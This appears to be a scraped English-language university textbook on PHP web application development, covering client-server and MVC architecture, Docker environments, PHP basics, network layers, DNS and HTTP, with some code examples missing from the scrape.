title: Web Application Development I
text:
Preface
This textbook is a self-study resource for the theoretical component of the course Web Application Development I (DAW1), Bachelor’s in Communication and Multimedia, covering server-side web application development with PHP, from the fundamentals of client-server communication to the architecture and security of modern web applications.
In the practical component of the course, students apply these concepts by building dynamic web sites with PHP and databases. This textbook covers the theoretical component; the practical component is covered separately, in the corresponding classes.

title: Web Application Development I
text:
Organisation
The text is organised into five thematic blocks, following the course’s official syllabus:

Web Foundations and Landscape — chapters 1 and 2, covering the process of developing a web application and the different types of servers and infrastructure
PHP Programming — chapters 3, 4 and 5, covering syntax, control flow, functions and code organisation
Communication and State on the Web — in this block, chapters 6 and 7, network models, the HTTP protocol, and state management with cookies and sessions
Data and Security — this block covers chapters 8 and 9, on databases with PHP and web application security
Architecture and Tools — finally, this block, chapters 10 and 11, covers the Model-View-Controller pattern and web development frameworks

How to Use This Textbook
Each chapter corresponds to one theoretical class of the course. Students are advised to read a chapter before the corresponding class, and to use this text as support for independent study, to review concepts and clarify doubts. Reading does not replace attendance in class, nor participation in the practical, in-class demonstrations. In every chapter involving PHP programming, the example code is presented directly in the text, and students are encouraged to experiment with the code, testing it and modifying it to better understand the concepts, through the challenges proposed at the end of each chapter.

title: 1  Software Development for the Web
text:
1.1.1 Frontend
The frontend programmer works on the client side, that is, in the browser, and is responsible for the interface the user interacts with directly. The base tools are HTML, CSS and JavaScript, often supported by frameworks such as React, Vue.js or Angular. React is today the most used, but Vue.js has established itself as the second most widely adopted option globally, ahead of Angular in developer satisfaction (‘State of JavaScript 2025: Front-End Frameworks’ 2025).


1.1.2 Backend
The backend programmer works on the server side: implements the business logic, manages database access, and exposes that logic to the outside world, typically through the HTTP protocol’s API. Uses languages such as PHP, Python or JavaScript (in a Node.js environment), and database management systems such as MySQL, MariaDB, PostgreSQL or MongoDB. Also handles server configuration and application deployment tasks.


1.1.3 Full Stack
The full stack programmer works on both sides, frontend and backend, with the tools described above or with frameworks that integrate both components, such as Laravel (in PHP), Django or FastAPI (in Python), or Next.js (in JavaScript/TypeScript).

1.4 CSS Frameworks and Preprocessors
Writing pure CSS for a large project is possible, but laborious. This gave rise to CSS frameworks, ready-to-use style and component libraries. Tailwind CSS is today the most used, ahead of Bootstrap (‘Top CSS Frameworks in 2025: What Devs Actually Use’ 2025); Foundation remains a niche option, mainly in existing enterprise projects.
Beyond component frameworks, there are tools that extend the CSS language itself. Sass is a preprocessor that adds functionality to CSS, such as variables, selector nesting and mixins; PostCSS transforms CSS through JavaScript plugins, with similar functionality. Native selector nesting, native variables (custom properties) and features such as color-mix() are now part of the CSS language itself, with broad support in modern browsers (‘Native CSS Nesting: Sass Syntax with No Build Step (and One Big Trap)’ 2025), covering much of what used to motivate the use of a preprocessor.

text:
1.6 Server-Side Technologies
Server-side technologies are organised into three broad groups: languages and frameworks, databases, and programming through the HTTP protocol’s API.

1.6.1 Languages
On the server side, the landscape of languages includes, among others, Node.js (JavaScript on the server), Python, PHP, C#, Go, Ruby, Java, Kotlin, Rust, Scala and Swift. PHP is one of the most used server-side languages, largely due to its historical connection to WordPress and a large part of the Web published through content management systems.


1.6.2 Server Frameworks
Each backend language has its own web development frameworks. In JavaScript, notable ones include Express, Koa, Fastify and Next.js; in Python, Django, Flask and FastAPI; in PHP, Laravel, Symfony and Slim. Laravel is today the most used PHP framework, ahead of Symfony (JetBrains 2025).


1.6.3 Databases and ORMs
Databases are essentially divided into two broad groups:

Relational, organised into tables with a fixed schema and relationships between them, such as PostgreSQL, MySQL or SQLite;
Non-relational (NoSQL), with more flexible schemas, such as MongoDB and Firebase (Cloud Firestore), both document-oriented (Google, n.d.), or Redis (key-value, widely used for caching).

To make it easier to access databases from object-oriented code, object-relational mapping (ORM) tools are frequently used, such as Eloquent (Laravel’s native ORM), Prisma, Drizzle or TypeORM in JavaScript/TypeScript, Mongoose for MongoDB, or SQLAlchemy in Python. Prisma is the most used by number of projects, but Drizzle has grown notably among projects that favour more direct control over the generated SQL (Bytebase 2026).

title: 2  Web Architectures and Infrastructure
text:
2.1.1 Client-Server Architecture
The client-server model is the architecture paradigm widely used in web application development, in which the roles of the computers or devices involved are split into two categories:

Client: a device or program that makes requests to a server to obtain services, resources or information. It is typically the browser, on computers, phones or tablets, and is responsible for interacting with the user and sending requests to the server.
Server: a program that responds to client requests, processing them, carrying out operations and sending the responses back.

A single computer can play both roles at the same time, running both the client and the server, and a server can respond to many clients simultaneously. What never changes is the direction of the request: it is always the client that starts the communication, the server only responds. A server does not send data to a client on its own initiative, without a prior request.
This model has a direct consequence on how a web application is organised: the code that runs on the client, HTML, CSS and JavaScript, is sent by the server but then executed entirely on the user’s computer, outside the backend programmer’s control; the code that runs on the server, in this case PHP, is on the other hand never visible to the client, which only receives the result of its processing. This separation is the basis of the whole architecture studied in this course: the frontend runs on the client, the backend runs on the server, and the two sides communicate through the HTTP protocol.
A static page, an .html file, is sent to the client exactly as it is stored on disk. A dynamic page, a .php file, is executed by the server on every request, and the HTML the client receives is generated at that moment from the available data (Figure 2.1). On an online magazine’s site, when a reader opens the address artigos.php?id=5:

the browser sends the request to the web server, through the HTTP protocol;
the web server, Apache, recognises a PHP file and hands it to the PHP interpreter;
PHP runs the code, which asks the database for article number 5;
the database, MySQL, returns that article’s title, author and text;
PHP inserts that data into a page template and produces HTML;
the web server sends that HTML to the browser, which shows it to the reader.







Figure 2.1: Path of a request to a dynamic page: the browser only sends the request and receives HTML; Apache, PHP and MySQL work on the server side.



If the article is corrected in the database, the next request already shows the corrected version, without any HTML file having been edited.


2.1.2 Model-View-Controller (MVC)
MVC is a software architecture pattern, originally proposed by Trygve Reenskaug in 1978, during his work at Xerox PARC on the Smalltalk language (Reenskaug 2003). Today it is one of the most used patterns in web application development, and separates the application into three components:

Model: represents the application’s data and business logic. Handles database access, data processing and business rules, and is responsible for storing and retrieving information.
View: responsible for presenting data to the user, taking care of the interface and how information is displayed. It can be a web page, a graphical interface, or any other presentation method.
Controller: acts as the intermediary between the model and the view. Receives user requests, processes them and decides what to do based on them, updating the model as needed and choosing the appropriate view to show the results.

In a typical PHP application, HTML and CSS make up the View, PHP implements the Controller (and, often, part of the Model too), and the database, such as MySQL, is where the Model persists the data.
The main advantage of MVC is the separation of responsibilities: whoever changes a page’s appearance does not need to touch the business logic, and whoever changes how data is processed does not need to touch the HTML. This makes the code easier to maintain as the application grows, allows different parts of the application to be tested independently, and makes it possible for several people to work simultaneously on different components of the same application without interfering with one another.


2.1.3 Three-Tier Architecture
Closely related to MVC is three-tier architecture (3-tier), which separates an application into a presentation tier (what the user sees and interacts with), a business logic tier (the application’s processing and rules) and a data tier (persistent storage). In a PHP application, this typically translates into HTML/CSS at the presentation tier, PHP at the logic tier, and MySQL at the data tier.
The difference between MVC and three-tier architecture is mainly one of level: MVC is a pattern for organising code within an application, while three-tier architecture describes, more generally, how those responsibilities are distributed, and can even run on different physical machines, for example an application server separate from the database server. In practice, for a PHP application like the ones developed in this course, the two architectures describe, to a large extent, the same separation of responsibilities seen from different angles.


2.1.4 Server-Side and Client-Side Rendering
In the path described above, it is the server that assembles the complete page: the page is rendered on the server (server-side rendering), the PHP model and the one followed in this book. In Single Page Applications (SPA), built with React, Angular or Vue, the opposite happens: the server sends an almost empty page and the JavaScript code, running in the browser, requests the data in JSON format and builds the page on the client itself (client-side rendering). Navigation becomes smoother, but the first load is heavier. Many applications combine the two models.

title: 2  Web Architectures and Infrastructure
text:
2.2 Infrastructure

2.2.1 Servers
A web server is the program responsible for listening for HTTP requests on a network port and returning responses, typically web pages or data. It is a piece of software that runs continuously on a machine, waiting for new connections, capable of handling many simultaneous requests from different clients. The most used web servers include Apache and NGinX, both capable of serving PHP pages, either through a built-in module or a separate process (such as PHP-FPM) that the web server invokes to run the PHP code.
Besides web servers, there are other specialised types of servers. In the Java world, for example, there are application servers such as GlassFish, currently maintained by the Eclipse Foundation as part of Jakarta EE, and WildFly (formerly known as JBoss Application Server; today the name of the commercial product supported by Red Hat is JBoss EAP). On the data side, MySQL Server is the most common example in the context of this course, running as a process separate from the web server, and communicating with PHP through a local network connection.
In production, these servers run on a machine permanently connected to the Internet, usually in one of three ways:

shared hosting: many sites on the same server, already configured with Apache, PHP and MySQL; it is cheap, but gives little control over the configuration;
virtual private server (VPS): a rented virtual machine, which the programmer configures to suit their needs;
cloud, such as Amazon Web Services, Microsoft Azure or Google Cloud: infrastructure or ready-to-use platforms, paid for according to the resources consumed.



2.2.2 Web Services (API)
An API (Application Programming Interface) of a web service allows different systems to communicate with one another over the network, typically over HTTP. From the point of view of MVC architecture, an API is, in many cases, a Controller that returns structured data, instead of an HTML page ready to show to the user, to be consumed by another application. The two best-known styles are:

REST (Representational State Transfer): uses HTTP methods (GET, POST, PUT, DELETE) on resources identified by URLs, and exchanges data typically in JSON. It is today the dominant style, representing around 75% of adoption among developers (DreamFactory 2025).
SOAP (Simple Object Access Protocol): a stricter, more formal protocol, based on XML, with an explicit service contract. Today it is mostly limited to legacy systems in regulated industries, such as banking, healthcare or enterprise systems (ERP), where it continues to process high transaction volumes despite no longer being the choice for new services (DreamFactory 2025).



2.2.3 Virtualisation
To develop and test web applications in isolation from the local computer’s operating system, and without the risk of the work’s outcome depending on that computer’s particularities, virtualised environments are used. There are two main approaches:
Virtual machines: each virtual machine includes its own complete operating system, in addition to the application and its dependencies. The advantage is that they are completely isolated from one another, and their configurations can be shared and reproduced reliably, ensuring that every student in a class works on exactly the same server configuration; the disadvantage is duplicated resources, since each virtual machine loads its own operating system, and longer startup times.
Containers: instead of replicating the whole operating system, containers share the host operating system’s kernel, encapsulating only the application and its dependencies. Docker is the reference tool for this model. The advantages are a smaller system footprint, faster startup, and ease of sharing, building and distribution; the disadvantage is less complete isolation than a whole virtual machine, since all the containers on a machine share the same operating system kernel.
The following table summarises the differences between the two approaches (Table 2.1).

In Docker, three concepts are essential:

container: an image in execution; several identical containers can be started from the same image, just as several cakes can be made from the same recipe;
Docker Compose: a file describing several containers that work together, for example the web server and the database, started with a single command.

This distinction is not merely academic: the same two approaches used to develop locally, in a virtual machine or in a container, are also the most common ways to put a web application into production on a real server, which makes the choice of development environment a decision with a direct impact on how the application will later be published.


2.2.4 This Course’s Working Environment
In this course, the backend is developed inside a docker container with Ubuntu, containing the Apache server (web server), MySQL (the database) and PHP 8 (programming language). Any text editor can be used, such as Visual Studio Code.
This environment isolates the development area from each student’s own computer operating system, be it macOS, Ubuntu or Windows, ensuring that everyone works on the same server, database and language configuration, regardless of the computer used at home.

Before deciding what language to program the Contraponto site in, it is worth understanding where each piece of the problem fits. Three-tier architecture, already introduced in Section 2.1.3, splits an application like this one into three parts: presentation, logic and data. The presentation layer is what Tiago has already mastered since the first year of his degree: HTML structures each page of the site, the article listing, an individual article’s page, the comment form; CSS handles their visual presentation; and JavaScript can, later, make the interface more dynamic. None of this changes in this course; it is the starting point on which all the following work is built.
What Tiago is missing is the logic layer: the code that runs on the server, decides which articles to show, and validates a comment submitted by a reader before passing it on to the data layer. As seen in Section 1.6.1, this layer can be written in any of several server languages, Node.js, Python or PHP, among others; this course chooses PHP, one of the most used in this role. The data layer, which the logic turns to in order to query or store articles, authors, categories and comments, is only introduced from Section 8.1 onward; until then, it is the logic layer itself that stores this data, in memory, as already seen in the next section. 3.6 Variables
A variable is a “container” for storing data the program will use. In PHP, a variable’s name has to follow a precise set of rules:

Always starts with the $ symbol;
After the $, the name has to start with a letter or an underscore (_), never a number;
Can only contain letters, numbers and underscores, no spaces or other symbols;
Is case sensitive: $idade and $Idade are two different variables, a common mistake that can cause a lot of confusion when debugging a script.

<?php
$idade = 19;       // valid
$_total = 0;       // valid, starts with an underscore
$nome_completo = "Ana Silva";  // valid

$1idade = 19;      // INVALID: cannot start with a number

text:
3.7 Data Types
Unlike languages such as Java or C#, PHP does not require declaring a variable’s type: the type is determined automatically by the assigned value, and can change if the variable later receives a value of another type. This feature is called dynamic typing. PHP supports the following data types:

String: text, delimited by single or double quotes;
Integer: whole numbers, positive or negative, with no decimal places;
Float (or double): numbers with decimal places;
Boolean: the values true or false;
Array: a collection of several values, a topic detailed in the next section;
Object: an instance of a class, grouping data and behaviour;
NULL: a special type, with a single possible value, null, representing the absence of a value;
Resource: a reference to a resource external to PHP, such as an open connection to a database or a file.

The first four, string, integer, float and boolean, are the simple types used in day-to-day programming; the remaining ones, array, object, NULL and resource, appear throughout this course as programs become more complex.
<?php
$idade = 19;                  // integer
$preco_do_almoco = 10.5;      // float
$texto = "Hello, World!";     // string
$porta_aberta = true;         // boolean
$sem_valor = null;            // NULL
The gettype() function returns a variable’s current type, which is particularly useful while learning the language, since type errors in PHP are not always obvious:
<?php
echo gettype($idade);           // integer
echo gettype($preco_do_almoco); // double
echo gettype($porta_aberta);    // boolean
A typical source of confusion for beginners: echo of a boolean value shows 1 for true, but shows literally nothing for false, which can at first look like a bug in the program itself, when it is simply PHP’s normal behaviour.
Strings can be concatenated with the . operator, and it is possible to mix text and variables directly in the same echo statement, either by concatenation or by writing the variable inside a double-quoted string:
<?php
$nome = "Ana";
$idade = 25;

echo "Name: " . $nome . ", Age: " . $idade . " years old";  // by concatenation
echo "Name: $nome, Age: $idade years old";                  // inside double quotes
Note that this variable interpolation only works with double quotes; inside single quotes, $nome would be displayed literally, without being replaced by its value.

3.7.1 Type Conversion
Even though typing in PHP is dynamic, it is often necessary to explicitly convert a value from one type to another, for example to ensure a number received from an HTML form, which always arrives as a string, is treated as a number before being used in a calculation. This conversion is done by placing the desired type, in parentheses, before the value:
<?php
$idade_texto = "25";           // string, as it would arrive from a form
$idade = (int) $idade_texto;   // 25, now an integer

$preco = "10.5";
$preco_num = (float) $preco;   // 10.5, now a float

$numero = 0;
$estado = (bool) $numero;      // false: 0, "", "0" and null convert to false

echo gettype($idade);   // integer
echo gettype($estado);  // boolean
PHP also converts types automatically, with no need to ask, whenever an operation requires it: in a sum, a purely numeric string is converted to a number with no warning at all:
<?php
$a = "10";
$b = "5";

echo $a + $b;   // 15 (integer), the strings are converted automatically
echo $a . $b;   // "105" (string), the . operator forces concatenation
This behaviour is useful, but also a common source of confusion for beginners: the same + symbol adds numbers, but . concatenates text, and it is easy to swap one for the other without PHP flagging any error, simply producing an unexpected result.

4.1 Conditional Structures
With the article catalogue complete, Tiago notices that not everything in the $artigos array should be treated the same way: an article can be ready to publish, or it can still just be a draft that Rita is reviewing. With what he knows so far, the only code he can write is a direct echo, always executed the same way, never varying with the data: there is no way to say “show this if the article is published, but not if it is still a draft”. This is exactly the kind of decision a conditional structure allows: it evaluates whether a condition is true or false, and executes a different block of code depending on the result, directing the flow of the program according to the data. In PHP, the most common structure is if/else, and it solves the article-status problem well:
This handles a yes-or-no decision well. But Tiago has another, similar problem: he wants the home page to highlight articles according to how many views they have already had, and this time there are more than two possible categories, not just “viral” or “not viral”. A single if/else only distinguishes two cases; when there are more than two alternatives, elseif is chained on:
This views problem is well solved with elseif because each alternative depends on a different range of values. But when Tiago wants to decide the site section from an article’s exact category, always comparing the same $categoria variable against several possible values, one by one, writing an elseif for each category starts to get repetitive: elseif ($categoria === "Cultura"), elseif ($categoria === "Música"), and so on. There is another, simpler way for Tiago to do the same thing, whenever what is at stake is comparing a single variable against several exact values: switch. Notice the use of break: without it, execution would continue on to the next case even after finding a match, a behaviour called fallthrough, sometimes used on purpose, as in the first two lines of the example, to group several cases under the same site section:

title: 5  PHP III: Functions, Dates and Includes
text:
5.1 Functions
As the Contraponto site grows, Tiago notices he is writing the same kind of code in several different places: whenever he shows an article, whether in the listing or on the article’s own page, he has to join the author to the category in the same format, “by Rita Ferreira, in Technology”. Copying that line to every new place it is needed is, sooner or later, a source of inconsistencies: if the format ever changes, he has to remember to change it everywhere he copied it. A function solves exactly this problem: it is a named set of instructions, written once, that can be called whenever it is needed. A function can accept parameters (input data) and return a value (output data), both optional:
A function can receive several parameters, and can define a default value for them, used when that parameter is not given in the call. This is what Tiago uses to estimate the reading time of an article, a common feature on content sites: by default, a reader is assumed to read 200 words per minute, but that speed can be adjusted when better known:

title: 6  Communication Models and Networks
text:
6.1 Why Organise Communication into Layers?
Before a Contraponto reader can even see the magazine’s home page, the request the browser sends to the server only gets there after a series of operations:
This set of operations is governed by rules that regulate each of these operations — the format of messages, the order of exchanges, error handling — which is precisely what is called a communication protocol. Without it, two devices cannot understand each other.
The browser does all of this without Tiago, on the server side, needing to think about any of these details. Before a request can leave the browser and reach a server, there is an entire stack of protocols that has to work correctly underneath that communication.
What, exactly, is a protocol? And what is a protocol stack? A protocol is a set of rules agreed between two parties (two devices) that want to communicate: it defines the exact format of the messages exchanged and the order in which they must be sent, so that both sides understand each other unambiguously. A protocol can be thought of as a contract between two remote devices on a network, defining the rules for how they will communicate at a distance.
No protocol, on its own, solves every problem involved in getting a message from one computer to another: several are needed, each handling a different part of the problem, the same four operations already mentioned above.
That set of protocols is organised so that each one, when it needs a feature offered by another, turns to that other protocol to obtain it. That relationship defines a hierarchy in which the protocols that use others are “above” and the ones being used are “below”. This arrangement is called a protocol stack, or layered architecture.
It is this stack, not a single isolated protocol, that the Contraponto reader’s request has to cross, without the user noticing, before it even reaches the server.
In a layered architecture, each layer is a module that depends on the layers below it, but is completely independent of the layers above it: it only needs to know how to use the layer immediately below it, not how the layers above it work. This allows each one to be developed, optimised or replaced independently of the others, as long as the service it provides to the layers above it stays the same. That service a layer provides to the layer immediately above it, without the latter needing to know how it is implemented underneath, is precisely called a service.
A service, like a protocol, can also be thought of as a kind of contract, but with an essential difference: a protocol is a contract between two remote devices, defining how they communicate at a distance; a service is a contract between layers within the same device, defining how they work with each other, locally. In other words, a service acts locally, while a protocol acts remotely.

title: 6  Communication Models and Networks

section: 6.2 The Two Models: OSI and TCP/IP
text:
6.2 The Two Models: OSI and TCP/IP
Historically, two reference models emerged for organising communication into layers, with different origins:

OSI (Open Systems Interconnection): developed by ISO (International Organization for Standardization) as a formal model, with seven layers: physical, data link, network, transport, session, presentation and application. Because it was formally defined and approved by an international standardisation body before being widely implemented, OSI is known as the de jure standard (by law, i.e., formally instituted).
TCP/IP (also called the DoD model, as it originated in the US Department of Defense): a simpler model, with only four layers, application, transport, network (or internet) and network access, which arose directly from the practical implementation of ARPANET, the precursor to the Internet. Because it became the model actually used, through its widespread adoption, before any formal international standardisation, TCP/IP is known as the de facto standard (as a matter of fact, i.e., imposed by practice and common use).







Figure 6.2: The OSI model, with its seven layers, from application (closest to the user) to physical (the transmission medium itself).



In practice, today’s Internet runs on the TCP/IP model, not on OSI: OSI continues to be used, mainly, as a pedagogical tool, because it divides more finely responsibilities that, in TCP/IP, appear concentrated in a single layer. For the purposes of this course, three layers of the TCP/IP model are of particular interest:

Application: where the protocols an application uses directly run, such as HTTP, the rough equivalent of OSI’s three upper layers (application, presentation and session);
Transport: responsible for reliably delivering data between two programs, through the TCP protocol;
Network: responsible for routing data between different networks, to its destination, through the IP protocol.

Each of these layers communicates with its peer layer (on the remote device) through a protocol (as seen in Figure 6.1): a set of rules that defines how data is exchanged between two entities of the same layer, one on the client side and one on the server side. It is the Application layer protocol of the TCP/IP model, known as HTTP, that defines the rules for how a browser requests a page from a server. HTTP will be the topic of the next chapter.






Note



To see which other real protocols run at each layer, and the more precise formalism behind the distinction between service and protocol, see Section D.2 and Section D.3.

title: 6  Communication Models and Networks
text:
6.3 The Data’s Journey: Encapsulation
When an application sends data, it passes through each layer of the TCP/IP model, and each layer adds its own control information, in a process called encapsulation. It is worth following this journey step by step, from the upper layers down to the physical medium.
The following figure summarises the whole journey: the data of an HTTP message leaves the application layer, passes through a socket (the connection point between the application layer and the protocol stack), and goes down the transport, network and link layers, each applying its own protocol and encapsulating the data it receives from the layer above, until it reaches the network card (NIC, Network Interface Controller), which finally converts it into an electrical or radio signal:






Figure 6.3: The journey of data from the application to the physical medium, layer by layer, down to the network card (NIC).









Note



Do not confuse the application layer with the application itself: the application layer is just one of the layers of the TCP/IP model, defining how data is exchanged between two remote applications; the application is the program the user directly uses, such as a browser or an email client, which uses the application layer to send and receive data. In Figure 6.3 the browser or email client is represented by the DADOS rectangle, which is the application sending the data.



6.3.1 The Transport Layer: TCP
The payload (the technical name given to the data, in this case, for example, an HTTP message) is passed to the transport layer by the application layer, through a socket, which adds to it a TCP header with the source and destination ports. These are two addresses that identify the applications sending and receiving the data — a browser or an email client.
Ports range from 0 to 65535, and the so-called well-known ports, from 0 to 1023, are reserved for well-known services, such as port 80 for HTTP or 443 for HTTPS. Table 6.1 shows the most common ports for some well-known protocols.



Table 6.1: Well-known ports for some common protocols.





Port
Protocol
Service




80
HTTP
Web pages (unencrypted)


443
HTTPS
Web pages (TLS-encrypted)


21
FTP
File transfer


25
SMTP
Sending email


53
DNS
Domain name resolution






TCP also guarantees that data arrives reliably and in the correct order: it divides it into numbered segments, and resends any segment that is not acknowledged by the receiver within a well-defined time window.






Note



The exact structure of the TCP header, and the mechanisms that guarantee this reliability, are covered in more depth in Section D.4.1, for the more curious students.




6.3.2 The Network Layer: IP
Next, the data passes to the network layer, to which an IP header is added with the source and destination IP addresses. An IPv4 address has the form (0-255).(0-255).(0-255).(0-255), such as 192.168.24.36; this address identifies each computer even if they are on different networks.
The same computer can have several IP addresses, one for each network interface it has. This is the case in Figure 6.3, where there are two network devices: the Wi-Fi network card and the Ethernet network card, each with its own IP address.






Note



The complete structure of the IP header is covered in more depth in Section D.4.2.




6.3.3 The Link Layer: Ethernet and MAC Addresses
After the network layer comes the data link layer, whose task is to deliver a packet to a machine within the same local network. This layer adds the source and destination MAC addresses (MAC stands for Medium Access Control), forming a frame, typically according to the IEEE 802.3 standard (Ethernet) or the equivalent for wireless networks. These addresses only identify devices within the same local network, and are assigned by the network card’s manufacturer, being unique worldwide. A MAC address has the form XX:XX:XX:XX:XX:XX, such as 00:1A:2B:3C:4D:5E.






Note



The complete structure of an Ethernet frame is covered in more depth in Section D.4.3.




6.3.4 The Physical Medium
Finally, at the physical layer, bits are converted into electrical signals, pulses of light (optical fibre) or radio waves (Wi-Fi), and transmitted through the corresponding physical channel. On the receiving side, this process happens exactly in reverse, layer by layer, until only the original application data remains; the complete journey, in both directions, is covered in more depth in Section D.5 and in Section D.6.
None of these addresses are theoretical abstractions: any computer, phone or tablet connected to a network has, at that very moment, a MAC address and an IP address assigned, visible in its own network settings. The following screenshot shows the Wi-Fi settings of an iPhone connected to the eduroam network, with its MAC address (labelled “Wi-Fi Address”), its IP address, the subnet mask and the router’s address:






Figure 6.4: The Wi-Fi settings of a mobile phone show, in practice, the MAC address and the IP address assigned to that device.



Table 6.2 summarises the different types of address added along the data’s journey, from the application to the physical medium: each layer of the TCP/IP model adds its own address, and each identifies something different.



Table 6.2: The different types of address used along the data’s journey.











Layer
Protocol
Source Address
Destination Address




Transport
TCP
Port of the sending application
Port of the receiving application


Network
IP
IP of the sending computer
IP of the receiving computer


Link
Ethernet
MAC of the sending network card
MAC of the receiving network card






It is precisely because these three levels exist that two applications, on two different computers, can only communicate with each other once all three addresses are identified: the port, which guarantees the data reaches the right application, within the right computer; the IP address, which guarantees it reaches the right computer, within the right network; and the MAC address, which guarantees it reaches the right network card, within the local network. If any one of these three is missing, communication cannot be completed.

title: 6  Communication Models and Networks
text:
6.4 Routing
Up to this point, data has always moved within the same local network, identified by the MAC address. But the Internet is, at its core, a huge network of networks: thousands of different local networks, connected to each other. It is this connection between networks that allows, for example, the Contraponto reader, from home, to reach the magazine’s server, which sits on a completely different network. The equipment responsible for that connection is called a router: its function is to receive packets coming from one network and forward them to the next network, along the right path to the destination.
A router recognises, from each packet’s destination IP address, that it is not meant for its own local network, and decides which network to forward it to next. A typical example: someone, at home, types a search into Google. The resulting packet has the destination IP set to the IP of Google’s servers. The home router receives that packet, recognises that the destination IP does not belong to its network, and forwards it to the public network; from router to router, hop by hop, the packet eventually reaches the destination computer, with the intended IP. To decide where to forward each packet, each router maintains a routing table, with rules that map possible destinations to the network interface the packet should follow.
It is worth noting the difference between a router and a switch: a switch interconnects several devices within the same local network, forwarding frames based on the MAC address; a router interconnects different networks with each other, forwarding packets based on the IP address. That is why a request to a server outside the local network, like Google’s in the earlier example, always passes through at least one router.

title: 6  Communication Models and Networks
text:
6.5 Ports, Addresses and URLs
An address such as http://www.utad.pt actually hides several pieces of information: the protocol to use (http), the server name (www.utad.pt), optionally, the port to use, and the resource to be accessed (i.e., the name of the web page). The browser needs all these separate pieces of information: the server’s address and the port to use. When no port is explicitly given, the well-known port of the protocol in question is assumed, port 80 in the case of HTTP, so http://www.utad.pt and http://www.utad.pt:80 are, in practice, equivalent.






Figure 6.5: The URL typed in the browser’s address bar is the starting point of the whole journey described in this chapter.



Since humans memorise text more easily than numbers, the address written in a URL always takes the form of a domain name, such as www.utad.pt, never an IP number directly. But the network, at the IP layer level, only understands numbers. It is DNS that bridges these two realities.

title: 6  Communication Models and Networks
text:
6.6 The Domain Name System (DNS)
DNS (Domain Name System) is the service responsible for translating domain names, such as www.utad.pt, into the corresponding IP address. The process is simple from the point of view of whoever uses it: the browser asks a name server what the IP corresponding to a given domain is, and the name system replies with the IP number, which the browser then uses in the IP header of every subsequent packet to that destination.






Figure 6.6: The domain name system is organised in a hierarchy, from the root domain (ROOT) to the top-level domains (TLD) and to each organisation’s domains.



DNS is not, however, a single server, but a hierarchical, distributed system of servers, organised by domains and subdomains: a server may not directly know the IP of www.utad.pt, but it knows which other server to ask, closer to that domain in the hierarchy, until the final answer is obtained. Only once the domain name has been resolved to its IP address can the HTTP request actually be sent to the destination server, which makes DNS resolution a mandatory step, and sometimes the slowest one, whenever a given site is accessed for the first time.






Figure 6.7: The process of resolving www.utad.pt: the browser asks the local DNS server, which in turn successively asks the root server, the .pt domain server and, finally, the utad.pt server, until it obtains the corresponding IP address.

7.1 The Components of the Web
Everything seen in the previous chapter, layers, encapsulation, ports, addresses and DNS, is the infrastructure the Web itself rests on. The Web, as a system, rests on three fundamental components:
A URL (Uniform Resource Locator) uniquely identifies a resource on the Web, combining the protocol to use (http, https), the server name (which DNS translates to an IP), the port, and the path to the intended resource within that server. It is precisely the HTTP protocol, built on top of all this infrastructure, that is the subject of this chapter.

title: 7  The HTTP Protocol and State Management
text:
7.2 The HTTP Protocol
HTTP (Hypertext Transfer Protocol) is the application-layer protocol that allows two applications to communicate with each other on the Web. Most of the time, one of these applications is a web server (such as Apache, Tomcat or GlassFish) and the other is a browser (such as Chrome, Firefox or Edge). It works according to a request-response model: the client sends an HTTP request to the server, and the server returns an HTTP response. This is the protocol the Contraponto reader’s browser uses every time it requests a page from the magazine’s server.

title: 7  The HTTP Protocol and State Management
text:
7.4 The Request Message
A complete HTTP request message has the following general structure:
[method] [URL] [http version in use]
[headers]

[body]
The method indicates the client’s intent. The most used in web development are GET and POST.

7.4.1 The GET Method
GET requests a resource, without that operation, by itself, changing anything on the server: it is the method used whenever a link is clicked, such as the one that takes the Contraponto reader to a category’s articles:
<a href="contraponto.pt/artigos.php?categoria=Cultura">Cultura</a>
For the same reason, GET can also be used in a form, as long as the goal is only to obtain a result, never to change something on the server, as would happen if this same category filter were done through a menu instead of a direct link. It is precisely this request that Section 7.5 revisits, from the server side.






Note



The exact syntax of a GET message, including the meaning of each of its parts, is detailed in Section E.2.1.




7.4.2 The POST Method
POST sends data to the server, typically to create or change a resource: it is the method used, for example, by the Contraponto comment form sketched in Section 3.2. Unlike GET, the data goes in the message body, not in the URL, and the request is not considered harmless: it usually records something or changes the server’s state in some way. It is also this request that Section 7.5 revisits, showing how PHP receives the data a reader submitted.






Note



The complete structure of an HTML form and the corresponding POST message is detailed in Section E.2.2.




7.4.3 GET vs. POST
The choice between GET and POST in a form has concrete practical consequences:

Disadvantage of GET: the values of the form fields become visible in the browser’s URL. For this reason, GET should never be used if the form data is sensitive, such as a password, and should not be shared or recorded in the browser’s history;
Advantage of GET: precisely because the parameters stay in the URL, it can be bookmarked or shared, allowing the same results to be revisited whenever needed, just like Contraponto’s own category link seen in Section 7.4.1; POST does not allow this directly, because the data is not visible in the URL.



7.4.4 Virtual Resources
Not all resources accessible through the Web exist, as such, as a file on the server. Many are created, or assembled “on the fly”, according to the client’s specific request, after the server retrieves the necessary data from a database, the topic of Section 8.1. A request to artigos.php?id=5, for example, does not correspond to a file literally called that; it corresponds to the execution of the artigos.php script, which, based on the id parameter, dynamically generates the content to return.

text:
7.6 HTTP Headers
Both the request and the response include headers, key-value pairs with additional information about the message, already present in the general structure shown in Section 7.4. The only required header in a request is Host, which indicates which server the request is meant for, essential when a single IP address hosts several different domains, as with Contraponto’s own server.






Note



Other common headers, such as Accept, are described in Section E.3.

title: 7  The HTTP Protocol and State Management
text:
7.8 HTTP Is a Stateless Protocol
The HTTP server does not, by itself, keep any information about the state of previous connections: after responding to a request, the server “forgets” that connection, a property called stateless. This has a relevant practical consequence: a single web page typically requires several resources, the HTML itself, the CSS style sheet, the JavaScript script, any images, and each of these resources requires an independent HTTP request, each with the cost of establishing its own connection. Browsers mitigate this cost with several connection-management strategies, but the principle remains: each request is, in itself, independent of all the others.
If every page has more than one resource and the server does not keep state, how does an e-commerce site know which items a user has put in their cart, or how does Contraponto recognise a reader who has already commented before, without asking them for their name again on every comment? For this, HTTP relies on state-management mechanisms, such as cookies and sessions, the topic of Section 7.9.






Note



The concrete strategies browsers use to mitigate this cost, parallel, persistent and pipelined connections, are described in Section E.4.
crumbs: 7  The HTTP Protocol and State Management

title: 7  The HTTP Protocol and State Management
text:
7.9 State Management: Cookies and Sessions
Although HTTP is, by nature, stateless, the most common behaviour on the Web is precisely the opposite: an e-commerce site needs to know which items a user has put in their cart, and Contraponto, for example, would need to recognise a reader who has already commented before, without asking them for their name again on every comment.
